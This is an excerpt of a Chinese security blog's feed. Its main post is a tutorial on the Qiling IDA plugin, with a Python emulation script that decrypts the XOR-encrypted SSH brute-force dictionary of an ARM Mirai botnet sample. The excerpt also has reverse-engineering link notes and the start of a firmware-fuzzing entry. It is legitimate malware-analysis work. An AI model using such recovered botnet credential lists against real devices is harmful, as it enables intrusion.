IDA Pro 和 x64dbg 逆向分析 Gootkit 恶意软件</strong><br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=242Tn0IL2jE</a></p><hr><h3 id="2018-5-22"><a href="#2018-5-22" class="headerlink" title="2018.5.22"></a>2018.5.22</h3><p>看到一个<strong>IDA快捷键的总结</strong> <a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf</a></p><p><strong>GDB基本命令</strong><br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf</a></p><p><strong>CTF知识合集</strong><br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>一个著名的游戏<strong>Dwarf Fortress</strong><br><a href="http://www.bay12games.com/dwarves/index.html" target="_blank" rel="noopener">http://www.bay12games.com/dwarves/index.html</a></p><hr><h3 id="2018-5-21"><a href="#2018-5-21" class="headerlink" title="2018.5.21"></a>2018.5.21</h3><p>早上五点被热醒。。。学校半夜断电，开不了空调，差评<br>开电脑继续看昨天的题，进展很大，在让栈指针平衡后，IDA可以F5了，瞬间很好理解，但是算法太复杂了，学习了gdb动态调试，的确是非常强大的工具。</p><p>还是没做出来，很难受<br>晚上看了一个很棒的CTF总结 <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/</a></p><hr><h3 id="2018-5-20"><a href="#2018-5-20" class="headerlink" title="2018.5.20"></a>2018.5.20</h3><p>本来准备“好好学英语”，结果实验室来了场练习赛<br>逆向是一道Linux的，压缩包里给了一个二进制文件和一个名为“out”的文件，里面是几行十六进制之类的，总感觉这个题给的形式在哪儿见过，但是想不起来了。F5不能分析，看看图形化分析，算法很复杂，想用angr，但存在alarm函数，angr脚本运行不了，毫无思路，感觉最近很浮躁</p><p>晚上边看英语边看RNG。。。</p><hr><h3 id="2018-5-19"><a href="#2018-5-19" class="headerlink" title="2018.5.19"></a>2018.5.19</h3><p>一整天又是实验课又是ACM比赛，晚上九点多才好好吃了顿饭。<br>打ACM太菜了，没算法没数据没脑洞，有几道题好不容易输出符合，还不给AC。。。还是滚回来看逆向好了(虽说也很菜)</p><hr><h3 id="2018-5-18"><a href="#2018-5-18" class="headerlink" title="2018.5.18"></a>2018.5.18</h3><p>今天就把前几天的也记上吧</p><h4 id="1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化"><a href="#1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化" class="headerlink" title="1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化"></a>1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化</h4><p>这篇文章加里面的链接可以说是优化博客非常全的一篇文章了</p><blockquote><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html</a></p></blockquote><h4 id="2-一个假装是死循环的有限循环"><a href="#2-一个假装是死循环的有限循环" class="headerlink" title="2.一个假装是死循环的有限循环"></a>2.一个假装是死循环的有限循环</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i&#x3D;1; i&lt;0; i++)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; &quot;我不是死循环&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>原理: 明天写。。。</p><h4 id="3-IDA-技巧-处理动态导入"><a href="#3-IDA-技巧-处理动态导入" class="headerlink" title="3.IDA 技巧-处理动态导入"></a>3.IDA 技巧-处理动态导入</h4><blockquote><p><a href="https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports" target="_blank" rel="noopener">https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports</a></p></blockquote><h4 id="4-逆向-Path-of-Exile-游戏系列"><a href="#4-逆向-Path-of-Exile-游戏系列" class="headerlink" title="4.逆向 Path of Exile 游戏系列"></a>4.逆向 Path of Exile 游戏系列</h4><blockquote><p>Part 1： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html</a><br>Part 2： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html</a><br>Part 3：<a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html</a></p></blockquote><h4 id="5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947"><a href="#5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947" class="headerlink" title="5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)"></a>5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)</h4><blockquote><p><a href="https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html</a></p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h1&gt;&lt;p&gt;&lt;del&gt;一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来&lt;/del&gt;&lt;/p&gt;
&lt;h2</summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用Qiling IDA插件解密Mirai病毒数据</title>
    <link href="https://kabeor.github.io/%E4%BD%BF%E7%94%A8Qiling%20IDA%E6%8F%92%E4%BB%B6%E8%A7%A3%E5%AF%86Mirai%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE/"/>
    <id>https://kabeor.github.io/%E4%BD%BF%E7%94%A8Qiling%20IDA%E6%8F%92%E4%BB%B6%E8%A7%A3%E5%AF%86Mirai%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE/</id>
    <published>2020-09-13T16:00:00.000Z</published>
    <updated>2020-10-11T11:46:19.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Qiling-IDA插件解密Mirai病毒数据"><a href="#使用Qiling-IDA插件解密Mirai病毒数据" class="headerlink" title="使用Qiling IDA插件解密Mirai病毒数据"></a>使用Qiling IDA插件解密Mirai病毒数据</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://www.qiling.io" target="_blank" rel="noopener">Qiling Framework</a> 基于Unicorn，能够在一个平台上模拟多个OS和架构的二进制文件，包括Linux、MacOS、Windows、FreeBSD、DOS、UEFI和MBR。它支持x86（16、32和64位）、ARM、ARM64和MIPS。因此，我们几乎不需要担心因为环境搭建困难及手头设备不足导致无法进行分析工作，尤其像基于ARM或MIPS的IoT固件，想要进行逆向分析和漏洞挖掘尤其不易。</p><p>在<a href="https://bbs.pediy.com/user-home-751602.htm" target="_blank" rel="noopener">澪同学</a>的帖子<a href="https://bbs.pediy.com/thread-261862.htm" target="_blank" rel="noopener">用麒麟框架深入分析实模式二进制文件</a>中提到了Qiling能够进行gdb远程调试，这实际上是我为Qiling所贡献的第一个功能。将调试能力赋予Qiling，我们就能够在完全可控的环境中对二进制文件进行动态分析，不必担心病毒样本对主机造成影响，能够绕过检测，甚至能够只执行其中的一部分。</p><p>但这样的调试还不够优雅，在这里我想要为大家介绍的是Qiling调试功能的全新模块：Qiling IDA插件。与当今最强大的反编译器结合，我们可以做很多很棒的事。不需要IDA remote server和虚拟机就能够轻松地在IDA上进行动态调试和反编译，实时查看寄存器，堆栈和内存，绘制代码的执行路径等。此外，结合自定义脚本，我们能够使用Qiling提供的全部功能。我们还有更高级的功能：自动分析并反ollvm控制流平坦化，这将在今后进行单独介绍。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装Qiling"><a href="#安装Qiling" class="headerlink" title="安装Qiling"></a>安装Qiling</h3><p>Qiling的安装方式在<a href="https://docs.qiling.io/en/latest/install/" target="_blank" rel="noopener">这里</a>，由于Qiling更新速度较快，想要获取最新版本请<code>git clone https://github.com/qilingframework/qiling/tree/dev</code>。</p><p><strong>注意</strong> 请将Qiling安装在IDA所使用的Python3环境内。</p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>插件的安装方式有两种</p><ol><li><p>作为一个IDA插件</p><p>只需要建立一个Qiling插件与IDA plugin目录的符号链接。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">ln -s &#x2F;absolute&#x2F;path&#x2F;to&#x2F;qiling&#x2F;extensions&#x2F;idaplugin&#x2F;qilingida.py &#x2F;path&#x2F;to&#x2F;your&#x2F;ida&#x2F;plugins&#x2F;</span><br><span class="line"></span><br><span class="line"># Macos</span><br><span class="line">ln -s &#x2F;absolute&#x2F;path&#x2F;to&#x2F;qiling&#x2F;extensions&#x2F;idaplugin&#x2F;qilingida.py &#x2F;Applications&#x2F;&lt;Your IDA&gt;&#x2F;ida.app&#x2F;Contents&#x2F;MacOS&#x2F;plugins&#x2F;</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">mklink C:\absolute\path\to\IDA\plugins\qilingida.py D:\absolute\path\to\qiling\extensions\idaplugin\qilingida.py</span><br></pre></td></tr></table></figure></div><p>IDA在启动时会自动加载Qiling插件。</p></li><li><p>作为一个脚本文件</p><p>运行IDA，点击<code>File/Script file...</code>，定位插件所在位置(也可以在<a href="https://raw.githubusercontent.com/qilingframework/qiling/dev/qiling/extensions/idaplugin/qilingida.py" target="_blank" rel="noopener">此处</a>下载最新版本)，选择qilingida.py即可。</p></li></ol><p>加载脚本后可以在<code>Edit-&gt;Plugins-&gt;Qiling Emulator</code>和右键菜单找到按钮。</p><p>插件的具体用法请访问 <a href="https://docs.qiling.io/en/latest/ida/" target="_blank" rel="noopener">https://docs.qiling.io/en/latest/ida/</a></p><h2 id="支持状态"><a href="#支持状态" class="headerlink" title="支持状态"></a>支持状态</h2><p><strong>插件支持IDA7.4+ &amp;&amp; Python3.6+, 当前建议使用环境macOS及Linux</strong></p><p>插件支持环境如下：</p><table><thead><tr><th></th><th>8086</th><th>x86</th><th>x86-64</th><th>ARM</th><th>ARM64</th><th>MIPS</th></tr></thead><tbody><tr><td>Windows (PE)</td><td>-</td><td>&#9745;</td><td>&#9745;</td><td>-</td><td>&#9744;</td><td>-</td></tr><tr><td>Linux (ELF)</td><td>-</td><td>&#9745;</td><td>&#9745;</td><td>&#9745;</td><td>&#9745;</td><td>&#9745;</td></tr><tr><td>MacOS (MachO)</td><td>-</td><td>&#9744;</td><td>&#9745;</td><td>-</td><td>&#9744;</td><td>-</td></tr><tr><td>BSD (ELF)</td><td>-</td><td>&#9744;</td><td>&#9745;</td><td>&#9744;</td><td>&#9744;</td><td>&#9744;</td></tr><tr><td>UEFI</td><td>-</td><td>&#9745;</td><td>&#9745;</td><td>-</td><td>-</td><td>-</td></tr><tr><td>DOS (COM)</td><td>&#9745;</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>MBR</td><td>&#9745;</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><ul><li>- : 不适用.</li><li>&#9744;: 不支持.</li><li>&#9745;: 支持.</li></ul><h2 id="使用Qiling-IDA插件解密Mirai"><a href="#使用Qiling-IDA插件解密Mirai" class="headerlink" title="使用Qiling IDA插件解密Mirai"></a>使用Qiling IDA插件解密Mirai</h2><p>配置好插件后我们就可以开始分析本次的示例Mirai了。</p><h3 id="视频展示"><a href="#视频展示" class="headerlink" title="视频展示"></a>视频展示</h3><p>为此我录制了视频来展示整体流程：</p><p>bilibili版本</p><iframe src="//player.bilibili.com/player.html?aid=884476758&bvid=BV1FK4y1a7SH&cid=229025475&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>Youtube版本<br><a href="https://www.youtube.com/watch?v=ZWMWTq2WTXk" target="_blank" rel="noopener"><img alt="Qiling&#39;s IDA Plugin: Instrument and Decrypt Mirai&#39;s Secret" data-src="https://i.ytimg.com/vi/ZWMWTq2WTXk/0.jpg" class="lazyload"></a></p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>本次使用的样本是ARM架构的IoT僵尸网络病毒Mirai。</p><p>通过分析我们可以在0xFC50处发现一些被加密的字符串，程序会把它们添加到一个table，而这个table事实上是病毒用来爆破ssh的字典。</p><p><a href="https://i.loli.net/2020/09/14/HjKdvfAbBEqcNJX.png" data-fancybox="group" data-caption="HjKdvfAbBEqcNJX" class="fancybox"><img alt="HjKdvfAbBEqcNJX" title="HjKdvfAbBEqcNJX" data-src="https://i.loli.net/2020/09/14/HjKdvfAbBEqcNJX.png" class="lazyload"></a></p><p>定位到0x12A20，我们会发现该函数正是用来加解密table的。</p><p><a href="https://i.loli.net/2020/09/14/2V4PvaYnJI6hwZe.png" data-fancybox="group" data-caption="2V4PvaYnJI6hwZe" class="fancybox"><img alt="2V4PvaYnJI6hwZe" title="2V4PvaYnJI6hwZe" data-src="https://i.loli.net/2020/09/14/2V4PvaYnJI6hwZe.png" class="lazyload"></a></p><p>使用F5进行反编译，可以看到加解密算法为异或key，因此我们只需要将加密数据输入该函数即可得到解密后的明文。</p><p><a href="https://i.loli.net/2020/09/14/CWZUQcMqz6I5XxO.png" data-fancybox="group" data-caption="CWZUQcMqz6I5XxO" class="fancybox"><img alt="CWZUQcMqz6I5XxO" title="CWZUQcMqz6I5XxO" data-src="https://i.loli.net/2020/09/14/CWZUQcMqz6I5XxO.png" class="lazyload"></a></p><p>分析解密循环的反汇编，我们可以得知，LR寄存器存放了待解密buffer的内存地址，因此我们只需要将加密数据写入该内存区域然后运行到循环结束就可以得到结果。</p><p><a href="https://i.loli.net/2020/09/14/sOLk6chqexmPobM.png" data-fancybox="group" data-caption="sOLk6chqexmPobM" class="fancybox"><img alt="sOLk6chqexmPobM" title="sOLk6chqexmPobM" data-src="https://i.loli.net/2020/09/14/sOLk6chqexmPobM.png" class="lazyload"></a></p><p>由于读写寄存器及内存的操作需要循环多次，我们手工操作会非常繁琐，因此Qiling IDA插件的自定义脚本就派上了用场。</p><h3 id="编写插件自定义脚本"><a href="#编写插件自定义脚本" class="headerlink" title="编写插件自定义脚本"></a>编写插件自定义脚本</h3><p>自定义脚本的基本结构如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QILING_IDA</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">custom_prepare</span><span class="params">(self, ql)</span>:</span>   <span class="comment"># Qiling初始化时调用</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">custom_continue</span><span class="params">(self, ql:Qiling)</span>:</span>  <span class="comment"># 点击“Continue”按钮时调用</span></span><br><span class="line">        hook = []</span><br><span class="line">        <span class="keyword">return</span> hook</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">custom_step</span><span class="params">(self, ql:Qiling, stepflag)</span>:</span>  <span class="comment"># 点击“Step”按钮时调用</span></span><br><span class="line">        hook = []</span><br><span class="line">        <span class="keyword">return</span> hook</span><br></pre></td></tr></table></figure></div><p>对于本样例，脚本如下，脚本分析在注释中说明</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_encode_string_memory_address</span><span class="params">(ql:Qiling)</span>:</span></span><br><span class="line">    <span class="comment"># 显示待解密buffer所在地址</span></span><br><span class="line">    memory_address_bytes = bytes(ql.mem.read(ql.reg.read(<span class="string">'LR'</span>), <span class="number">0x4</span>))</span><br><span class="line">    memory_address = hex(struct.unpack(<span class="string">'&lt;I'</span>, memory_address_bytes)[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">'encode_string_memory_address at: '</span>+memory_address)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_LR</span><span class="params">(ql:Qiling, encoded_message_ascii)</span>:</span></span><br><span class="line">    encode_string_length=len(encoded_message_ascii)</span><br><span class="line">    encode_bytes_length=encode_string_length.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在内存中覆写待解密buffer的长度</span></span><br><span class="line">    ql.mem.write(ql.reg.read(<span class="string">'LR'</span>)+<span class="number">0x4</span>, encode_bytes_length)</span><br><span class="line"></span><br><span class="line">    memory_address_bytes = bytes(ql.mem.read(ql.reg.read(<span class="string">'LR'</span>), <span class="number">0x4</span>))</span><br><span class="line">    memory_address = hex(struct.unpack(<span class="string">'&lt;I'</span>, memory_address_bytes)[<span class="number">0</span>])</span><br><span class="line">    memory_address = int(memory_address, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将待解密buffer中的值替换为我们需要解密的数据</span></span><br><span class="line">    new_encode=<span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> encoded_message_ascii:</span><br><span class="line">        new_encode += x.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">'big'</span>)</span><br><span class="line">    ql.mem.write(memory_address, new_encode)</span><br><span class="line">    print(<span class="string">'Encode: '</span>, bytes(ql.mem.read(memory_address, len(encoded_message_ascii))))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_show</span><span class="params">(ql, encoded_message_ascii)</span>:</span></span><br><span class="line">    <span class="comment"># 读取待解密buffer中的值</span></span><br><span class="line">    encode_string_length=len(encoded_message_ascii)</span><br><span class="line">    memory_address_bytes = bytes(ql.mem.read(ql.reg.read(<span class="string">'LR'</span>), <span class="number">0x4</span>))</span><br><span class="line">    memory_address = hex(struct.unpack(<span class="string">'&lt;I'</span>, memory_address_bytes)[<span class="number">0</span>])</span><br><span class="line">    memory_address = int(memory_address, <span class="number">16</span>)</span><br><span class="line">    print(<span class="string">'Decode: '</span>, bytes(ql.mem.read(memory_address, encode_string_length)).replace(<span class="string">b'T'</span>, <span class="string">b' '</span>))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QILING_IDA</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">custom_prepare</span><span class="params">(self, ql)</span>:</span></span><br><span class="line">        ql.patch(<span class="number">0xF58C</span>, <span class="string">b'\x90\x90\x90\x90\x90'</span>)  <span class="comment"># 将该地址的clock函数nop，否则无法继续模拟</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取加密数据，转换格式</span></span><br><span class="line">        encoded_message_bytes = bytes(ql.mem.read(<span class="number">0x1393C</span>, <span class="number">0x1395B</span><span class="number">-0x1393C</span>))</span><br><span class="line">        encoded_message_ascii = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> encoded_message_bytes:</span><br><span class="line">            encoded_message_ascii.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 显示待解密buffer所在地址，便于在内存中查看结果</span></span><br><span class="line">        ql.hook_address(show_encode_string_memory_address, <span class="number">0x12A68</span>)</span><br><span class="line">        <span class="comment"># 将加密数据写入LR指向的内存地址</span></span><br><span class="line">        ql.hook_address(hook_LR, <span class="number">0x12A70</span>, user_data=encoded_message_ascii)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">custom_continue</span><span class="params">(self, ql:Qiling)</span>:</span></span><br><span class="line">        <span class="comment"># 读取加密数据，转换格式</span></span><br><span class="line">        encoded_message = bytes(ql.mem.read(<span class="number">0x1393C</span>, <span class="number">0x1395B</span><span class="number">-0x1393C</span>))</span><br><span class="line">        encoded_message_ascii = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> encoded_message:</span><br><span class="line">            encoded_message_ascii.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 显示每循环一次后当前内存的解密状态</span></span><br><span class="line">        decode_show_hook = ql.hook_address(decode_show, <span class="number">0x12AC8</span>, user_data=encoded_message_ascii)</span><br><span class="line">        <span class="comment"># 返回该hook的handle，插件将自动处理</span></span><br><span class="line">        hook = [decode_show_hook]</span><br><span class="line">        <span class="keyword">return</span> hook</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">custom_step</span><span class="params">(self, ql:Qiling, stepflag)</span>:</span></span><br><span class="line">        hook = []</span><br><span class="line">        <span class="keyword">return</span> hook</span><br></pre></td></tr></table></figure></div><h3 id="初始化插件"><a href="#初始化插件" class="headerlink" title="初始化插件"></a>初始化插件</h3><ol><li><p>右键-Qiling Emulator-Setup</p></li><li><p>设置rootfs(即环境根目录，Qiling会加载其中的lib，一般建议使用qiling/example/rootfs下对应环境的文件夹路径作为rootfs)，本次分析样本还需要将<code>ld-uClibc.so.0</code>放置在rootfs/lib目录下。</p></li><li><p>设置自定义脚本文件的路径。</p></li></ol><p><a href="https://i.loli.net/2020/09/14/TWn7x9i8UQopdXD.png" data-fancybox="group" data-caption="TWn7x9i8UQopdXD" class="fancybox"><img alt="TWn7x9i8UQopdXD" title="TWn7x9i8UQopdXD" data-src="https://i.loli.net/2020/09/14/TWn7x9i8UQopdXD.png" class="lazyload"></a></p><p>如果Qiling初始化和加载自定义脚本成功，则IDA输出窗口显示如下内容</p><p><a href="https://i.loli.net/2020/09/14/zerJ3cawnti1XqO.png" data-fancybox="group" data-caption="zerJ3cawnti1XqO" class="fancybox"><img alt="zerJ3cawnti1XqO" title="zerJ3cawnti1XqO" data-src="https://i.loli.net/2020/09/14/zerJ3cawnti1XqO.png" class="lazyload"></a></p><p><strong>提示</strong> 在IDA 反汇编界面的基址位置会显示该文件所依赖的lib。</p><p><a href="https://i.loli.net/2020/09/14/AZYagoMuCR7V3Qx.png" data-fancybox="group" data-caption="AZYagoMuCR7V3Qx" class="fancybox"><img alt="AZYagoMuCR7V3Qx" title="AZYagoMuCR7V3Qx" data-src="https://i.loli.net/2020/09/14/AZYagoMuCR7V3Qx.png" class="lazyload"></a></p><h3 id="运行插件进行解密"><a href="#运行插件进行解密" class="headerlink" title="运行插件进行解密"></a>运行插件进行解密</h3><p>回到加解密函数，我们在解密循环前设置断点，用于访问内存地址，并在循环结束后设置断点，因为不必继续模拟。</p><p><a href="https://i.loli.net/2020/09/14/ZqDMjOE1U5d9Vum.png" data-fancybox="group" data-caption="ZqDMjOE1U5d9Vum" class="fancybox"><img alt="ZqDMjOE1U5d9Vum" title="ZqDMjOE1U5d9Vum" data-src="https://i.loli.net/2020/09/14/ZqDMjOE1U5d9Vum.png" class="lazyload"></a></p><p>点击右键-Qiling Emulator-Continue，Qiling将模拟到第一个断点</p><p><a href="https://i.loli.net/2020/09/14/jWl3ILKydSF54be.png" data-fancybox="group" data-caption="jWl3ILKydSF54be" class="fancybox"><img alt="jWl3ILKydSF54be" title="jWl3ILKydSF54be" data-src="https://i.loli.net/2020/09/14/jWl3ILKydSF54be.png" class="lazyload"></a></p><p>我们得到了待解密buffer起始地址为0x1E258</p><p>右键-Qiling Emulator-View Memory，输入地址及要查看的内存大小，即可查看实时内存</p><p><a href="https://i.loli.net/2020/09/14/1JysKVLMeAZmRid.png" data-fancybox="group" data-caption="1JysKVLMeAZmRid" class="fancybox"><img alt="1JysKVLMeAZmRid" title="1JysKVLMeAZmRid" data-src="https://i.loli.net/2020/09/14/1JysKVLMeAZmRid.png" class="lazyload"></a></p><p>同样的，在右键-Qiling Emulator中点击 View Register和View Stack可以查看寄存器及堆栈。整理窗口位置后如下</p><p><a href="https://i.loli.net/2020/09/14/ru8KUFs1iYePxph.png" data-fancybox="group" data-caption="ru8KUFs1iYePxph" class="fancybox"><img alt="ru8KUFs1iYePxph" title="ru8KUFs1iYePxph" data-src="https://i.loli.net/2020/09/14/ru8KUFs1iYePxph.png" class="lazyload"></a></p><p>可以看出当前内存中已经写入了我们要解密的数据，在寄存器R2中则存储着将要异或的key。</p><p>再次点击Continue，进行解密</p><p><a href="https://i.loli.net/2020/09/14/xpnhOwdZBHgARt3.png" data-fancybox="group" data-caption="xpnhOwdZBHgARt3" class="fancybox"><img alt="xpnhOwdZBHgARt3" title="xpnhOwdZBHgARt3" data-src="https://i.loli.net/2020/09/14/xpnhOwdZBHgARt3.png" class="lazyload"></a></p><p>内存窗口中黄色字符串即为发生变化的内存，右侧输出窗口也实时显示了解密结果(动态效果参见视频)。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次我使用了一个较为简单的例子向大家演示了Qiling IDA插件的功能，但它的潜力远不仅此。未来我们也会继续添加更多可用功能，使其更加完整。</p><p>当然，在开发过程中也不可避免会出现bug，请到<a href="https://github.com/qilingframework/qiling/issues提issue。" target="_blank" rel="noopener">https://github.com/qilingframework/qiling/issues提issue。</a></p><p>同时我们也欢迎各位参与到开发中，提出pr。</p><p>如果有更多问题和想法，欢迎到<a href="https://gitter.im/qilingframework/community" target="_blank" rel="noopener">gitter</a>或QQ群: 486812017 进行交流。</p><p><a href="https://i.loli.net/2020/09/14/lRavQ2S57zxfoBd.png" data-fancybox="group" data-caption="lRavQ2S57zxfoBd" class="fancybox"><img alt="lRavQ2S57zxfoBd" title="lRavQ2S57zxfoBd" data-src="https://i.loli.net/2020/09/14/lRavQ2S57zxfoBd.png" class="lazyload"></a></p><p>觉得项目不错的话就请给个<a href="https://github.com/qilingframework/qiling" target="_blank" rel="noopener">star</a>吧～</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;使用Qiling-IDA插件解密Mirai病毒数据&quot;&gt;&lt;a href=&quot;#使用Qiling-IDA插件解密Mirai病毒数据&quot; class=&quot;headerlink&quot; title=&quot;使用Qiling IDA插件解密Mirai病毒数据&quot;&gt;&lt;/a&gt;使用Qiling</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>IoT固件提取并使用qiling进行fuzz</title>
    <link href="https://kabeor.github.io/IoT%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%B9%B6%E4%BD%BF%E7%94%A8qiling%E8%BF%9B%E8%A1%8Cfuzz/"/>
    <id>https://kabeor.github.io/IoT%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%B9%B6%E4%BD%BF%E7%94%A8qiling%E8%BF%9B%E8%A1%8Cfuzz/</id>
    <published>2020-07-17T16:00:00.000Z</published>
    <updated>2020-07-18T09:45:51.640Z</updated>
    
